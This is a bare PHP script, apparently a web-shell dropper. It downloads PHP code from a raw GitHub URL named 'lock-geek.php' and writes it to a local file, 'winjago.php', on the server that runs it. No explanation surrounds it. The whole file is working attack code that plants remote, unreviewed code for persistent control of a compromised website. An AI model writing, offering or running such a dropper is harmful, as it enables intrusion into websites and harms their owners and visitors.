<?php
$make = fopen('winjago.php', 'w+');
$get = file_get_contents('https://raw.githubusercontent.com/zivanaoktora/lock-geek/main/lock-geek.php');
fwrite($make, $get);
fclose($make);
?>
